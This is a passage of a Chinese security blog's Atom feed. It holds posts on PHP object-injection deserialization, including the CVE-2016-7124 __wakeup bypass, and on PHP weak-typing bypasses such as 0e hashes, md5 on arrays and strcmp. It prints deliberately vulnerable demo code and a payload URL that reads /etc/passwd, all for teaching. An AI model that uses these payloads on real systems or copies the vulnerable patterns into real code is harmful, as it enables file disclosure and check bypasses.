class="keyword">class</span> <span class="title">info</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $name = <span class="string">'church'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'__construct'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'__destruct'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'__toString'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'__sleep'</span>;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span>);</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'__wakeup'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$usr = <span class="keyword">new</span> info();</div><div class="line"></div><div class="line">$usr-&gt;printdata();</div><div class="line"><span class="keyword">echo</span> $usr;</div><div class="line">$serialized = serialize($usr);</div><div class="line"><span class="keyword">echo</span> $serialized;</div><div class="line"></div><div class="line">$unserialized = unserialize($serialized);</div><div class="line">$unserialized-&gt;printdata();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>这时会输出</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">__construct</div><div class="line">church</div><div class="line">__toString</div><div class="line">__sleep</div><div class="line">O:4:"info":1:&#123;s:4:"name";s:6:"church";&#125;</div><div class="line">__wakeup</div><div class="line">church</div><div class="line">__destruct</div><div class="line">__destruct</div></pre></td></tr></table></figure><p>可以很清楚的看到这些魔术函数的自动调用，类似的魔术方法还有很多，这里不再一一列举。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先看一个简单的demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;  </div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;  </div><div class="line">            <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;file);      </div><div class="line">        &#125;</div><div class="line">    &#125;  </div><div class="line">&#125;</div><div class="line">  </div><div class="line">$file = $_GET[<span class="string">"file"</span>];   </div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file)) &#123;</div><div class="line">    <span class="keyword">echo</span> unserialize($file);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>这个代码调用了<code>Read</code>类，并且有一个<code>file</code>值是我们可以控制的，所以构造类似这样的payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?file=O:4:"Read":1:&#123;s:4:"file";s:11:"/etc/passwd";&#125;</div></pre></td></tr></table></figure><p>这时仅需一个GET请求便能读取文件。</p><h2 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h2><p>php前一段时间爆了一个漏洞(<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="external">php bugs 72663</a> )，当反序列化一个对象时，假如属性发生了变化，就会导致<code>__wakeup()</code>中的<code>return 0</code>不会执行。简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>方法。</p><p>影响版本<code>PHP5 &lt; 5.6.25</code> 、<code>PHP7 &lt; 7.0.10</code></p><p>写了个简单的demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $name = <span class="string">'church'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'__destruct'</span>;</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'__wakeup'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//$usr = new info();</span></div><div class="line"><span class="comment">//$serialized = serialize($usr);</span></div><div class="line"><span class="comment">//echo $serialized;</span></div><div class="line"></div><div class="line">$unserialized = unserialize($serialized);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>正常情况下序列化后<code>$serialized</code>是这样的</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:4:"info":1:&#123;s:4:"name";s:6:"church";&#125;</div></pre></td></tr></table></figure><p>执行之后，结果是这样的</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">__wakeup</div><div class="line">__destruct</div></pre></td></tr></table></figure><p>可以看到<code>__wakeup()</code>方法被调用了。</p><p>那把<code>$serialized</code>改成下面这个样子</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:4:"info":2:&#123;s:4:"name";s:6:"church";&#125;</div></pre></td></tr></table></figure><p>再次执行之后，看结果</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__destruct</div></pre></td></tr></table></figure><p>由于表示对象属性个数的值大于真实的属性个数，很明显<code>__wakeup()</code>方法这次被跳过了。</p><p><strong>漏洞实例分析</strong>：<a href="http://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a></p><p><br></p><p><strong>参考</strong></p><p><a href="http://php.net/manual/en/" target="_blank" rel="external">PHP文档</a></p><p><a href="http://www.freebuf.com/vuls/80293.html" target="_blank" rel="external">通过PHP反序列化进行远程代码执行</a></p><p><a href="http://bobao.360.cn/learning/detail/3193.html" target="_blank" rel="external">PHP反序列化漏洞成因及漏洞挖掘技巧与案例</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;反序列化漏洞在各种语言中都较为常见，下面就简单聊一聊PHP的反序列化漏洞(PHP对象注入)。第一次了解这个洞还是在某次ctf上，就简单记录下个人理解以及对CVE-2016-7124的简单分析。&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="https://evilchurch.github.io/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://evilchurch.github.io/tags/PHP/"/>
    
      <category term="Web安全" scheme="https://evilchurch.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP一些特性引发的安全问题</title>
    <link href="https://evilchurch.github.io/CHURCH/php-security.html"/>
    <id>https://evilchurch.github.io/CHURCH/php-security.html</id>
    <published>2016-11-01T09:31:16.000Z</published>
    <updated>2017-11-01T15:37:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>没人质疑PHP的强大，可是它本身的一些特性也引发了一些安全问题。刚好最近在撸一些ctf题目，就对我见到的PHP存在的问题总结记录一下。</p><a id="more"></a><h2 id="弱类型问题"><a href="#弱类型问题" class="headerlink" title="弱类型问题"></a>弱类型问题</h2><p>在PHP中，可以执行这样操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$var = <span class="number">1</span>;</div><div class="line">$var = <span class="keyword">array</span>();</div><div class="line">$var = <span class="string">'string'</span>;</div></pre></td></tr></table></figure><p>它不会验证变量的类型，也可以随时转换变量类型。估计开发者原本是想让程序员更加高效的开发，所以在大量内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。</p><ul><li>比较运算时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$a = <span class="keyword">null</span>; $b = <span class="string">''</span>; $a == $b  <span class="comment">//true</span></div><div class="line">$a = <span class="keyword">null</span>; $b = <span class="keyword">false</span>; $a == $b  <span class="comment">//true</span></div><div class="line">$a = <span class="number">0</span>; $b = <span class="string">'0'</span>; $a == $b  <span class="comment">//true</span></div><div class="line">$a = <span class="number">0</span>; $b = <span class="string">'0'</span>; $a === $b  <span class="comment">//false</span></div><div class="line">$a = <span class="number">0</span>; $b = <span class="string">'string'</span>; $a == $b  <span class="comment">//true</span></div></pre></td></tr></table></figure><p>可见PHP在处理比较运算时，不会检查表达式类型，只在恒等比较时才同时检查表达式的值与类型。</p><ul><li>hash比较时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var_dump(<span class="string">'0e12345'</span> == <span class="number">0</span>);  <span class="comment">//true</span></div><div class="line">var_dump(<span class="string">'0e12345'</span> == <span class="string">'0e54321'</span>);  <span class="comment">//true</span></div><div class="line">var_dump(<span class="string">'0e12345'</span> == <span class="string">'0e12345a'</span>);  <span class="comment">//false</span></div></pre></td></tr></table></figure><p>可以看到在遇到<code>0e\d+</code>类型的字符串时，会把此类型字符串作为科学计数法来处理，所以左右两边都为<code>0*10^n = 0</code> 。假如<code>md5(str)</code>为此类型的话，就可以构造<code>md5(str1) == md5(str2)</code>来绕过一些过滤。当然，这样的字符串有很多，详见<a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷</a>。</p><ul><li>类型强制转换</li></ul><ol><li>当string遇上int</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var_dump(<span class="number">0</span> == <span class="string">'abcd'</span>);  <span class="comment">//true  </span></div><div class="line">var_dump(<span class="number">1</span> == <span class="string">'1abcd'</span>);  <span class="comment">//true</span></div></pre></td></tr></table></figure><p>当有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。而转换过程中，’1abcd’的转换后的值是1，而‘abcd’是0，说明了intval返回字符串中第一个非数字的字符之前的数字串所代表的整数值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var_dump(intval(<span class="string">'12.12a'</span>));  <span class="comment">//12</span></div></pre></td></tr></table></figure><ul><li>内置函数的松散</li></ul><ol><li><p>md5()</p><p>md5() 函数用于对字符串进行md5加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var_dump(md5(<span class="string">'1'</span>));  <span class="comment">//c4ca4238a0b923820dcc509a6f75849b</span></div></pre></td></tr></table></figure><p>当参数是string时正常加密，但是当你传递一个array时，函数不会报错，只是返回null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$a[] =<span class="number">1</span>;</div><div class="line">$b[] =<span class="number">2</span>;</div><div class="line">var_dump(md5($a));  <span class="comment">//null</span></div><div class="line">var_dump(md5($a)===md5($b));  <span class="comment">//true</span></div></pre></td></tr></table></figure><p>这样就可以构造任意2个array来绕过md5函数的检测。</p></li><li><p>in_array()</p><p>in_array() 函数检查数组中是否存在某个值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$array=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">'3'</span>];</div><div class="line">var_dump(in_array(<span class="string">'abc'</span>, $array));  <span class="comment">//true</span></div></pre></td></tr></table></figure><p>如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否相同。只有加了strict才会对类型进行严格比较， 那么我们再次把整形和字符串进行比较呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var_dump(in_array(<span class="string">'abc'</span>, $array));  <span class="comment">//true</span></div><div class="line">var_dump(in_array(<span class="string">'1bc'</span>, $array));  <span class="comment">//true</span></div><div class="line">var_dump(in_array(<span class="string">'4'</span>, $array));  <span class="comment">//false</span></div></pre></td></tr></table></figure><p>它遍历了array的每个值，并且作”\==”比较(当设置了strict 用”===”)，上面的情况前两个返回的都是true，因为’abc’会转换为0，’1bc’转换为1。那么我们完全就可以很容易的用构造好的int 0或1来绕过检测函数，使它返回为真。</p></li><li><p>strcmp()</p><p>strcmp() 函数比较两个字符串，该函数返回：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>  <span class="comment">//如果两个字符串相等</span></div><div class="line">&lt;<span class="number">0</span>  <span class="comment">//如果 string1 小于 string2</span></div><div class="line">&gt;<span class="number">0</span>  <span class="comment">//如果 string1 大于 string2</span></div></pre></td></tr></table></figure><p>这里的strcmp函数实际上是将两个变量转换成ascii 然后做数学减法，返回一个int的差值。</p><p>也就是说键入’a’和’a’进行比较得到的结果就是0</p><p>那么如果让$array和‘a’比较呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//localhost/test.php?a[]=1</span></div><div class="line">var_dump(strcmp($_GET[a],<span class="string">'a'</span>));  <span class="comment">//null</span></div></pre></td></tr></table></figure><p>也就是说，我们让这个函数出错从而来绕过函数的检查。</p></li></ol><h2 id="浮点数精度问题"><a href="#浮点数精度问题" class="headerlink" title="浮点数精度问题"></a>浮点数精度问题</h2><p>在PHP manual中有提到：</p><blockquote><p>以十进制能够精确表示的有理数如 0.1 或 0.7，不能在不丢失一点点精度的情况下转换为二进制的格式。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var_dump(intval((<span class="number">0.1</span>+<span class="number">0.7</span>)*<span class="number">10</span>));  <span class="comment">//int(7)</span></div><div class="line">var_dump(floor((<span class="number">0.1</span>+<span class="number">0.7</span>)*<span class="number">10</span>));  <span class="comment">//float(7)</span></div><div class="line">var_dump(intval(<span class="number">0.58</span>*<span class="number">100</span>));  <span class="comment">//int(57)</span></div><div class="line">var_dump(floor(<span class="number">0.58</span>*<span class="number">100</span>));  <span class="comment">//floatt(57)</span></div></pre></td></tr></table></figure><p>为什么会这样的？简单分析一下</p><p><code>0.1</code> 的二进制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">符号位 <span class="number">0</span> </div><div class="line">指数 <span class="number">01111011</span> （<span class="number">-4</span>）</div><div class="line">尾数 <span class="number">1.10011001100110011001101</span> (<span class="number">1.60000002384185791015625</span>)</div></pre></td></tr></table></figure><p>将这个数再转回十进制：<code>0.10000000149011612</code></p><p><code>0.7</code> 的二进制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">符号位 <span class="number">0</span> </div><div class="line">指数 <span class="number">01111110</span>  (<span class="number">-1</span>)</div><div class="line">尾数 <span class="number">1.01100110011001100110011</span> (<span class="number">1.39999997615814208984375</span>)</div></pre></td></tr></table></figure><p>将这个数再转回十进制：<code>0.699999988079071</code></p><p>很明显，在转换为二进制的过程中丢失了精度，<code>0.1 + 0.7</code> 的结果是 <code>0.79999998956919</code></p><p><br></p><p><strong>参考：</strong></p><p><a href="http://drops.wooyun.org/tips/4483" target="_blank" rel="external">浅谈PHP弱类型安全</a></p><p><a href="http://www.laruence.com/2013/03/26/2884.html" target="_blank" rel="external">PHP浮点数的一个常见问题的解答</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;没人质疑PHP的强大，可是它本身的一些特性也引发了一些安全问题。刚好最近在撸一些ctf题目，就对我见到的PHP存在的问题总结记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="https://evilchurch.github.io/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://evilchurch.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://evilchurch.github.io/CHURCH/hello-world.html"/>
    <id>https://evilchurch.github.io/CHURCH/hello-world.html</id>
    <published>2016-10-05T06:51:18.000Z</published>
    <updated>2017-11-01T15:35:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
